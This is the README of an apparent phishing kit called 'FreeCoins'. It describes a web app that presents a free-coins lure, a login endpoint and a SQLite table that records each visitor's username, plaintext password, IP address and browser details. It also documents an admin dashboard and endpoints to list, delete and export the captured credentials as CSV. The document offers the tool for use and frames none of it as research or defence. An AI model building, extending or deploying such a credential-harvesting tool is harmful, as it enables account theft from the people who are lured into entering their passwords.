# FreeCoins Web App & Database

A web application with an automated SQLite database to capture and store submitted user credentials.

## 🚀 How to Run

1. **Install Dependencies** (if not already installed):
   ```bash
   npm install
   ```

2. **Start the Server & Database**:
   ```bash
   npm start
   ```

3. **Open the Web Application**:
   - Main Website: [http://localhost:3000](http://localhost:3000)
   - Database Admin Dashboard: [http://localhost:3000/admin.html](http://localhost:3000/admin.html)

---

## 🗄️ Database Details

- **Database Engine**: SQLite 3
- **File**: `database.sqlite` (created automatically on startup)
- **Table**: `submissions`
  - `id`: Auto-incrementing primary key
  - `username`: Email / username entered by the user
  - `password`: Password entered
  - `ip_address`: Client IP address
  - `user_agent`: Browser and OS information
  - `created_at`: Date and time of submission

---

## 🛠️ API Endpoints

- `POST /api/login` - Submits and saves details to the SQLite database
- `GET /api/submissions` - Returns all saved submissions in JSON
- `DELETE /api/submissions/:id` - Deletes a specific entry
- `DELETE /api/submissions` - Clears all entries
- `GET /api/export/csv` - Downloads submissions as a CSV file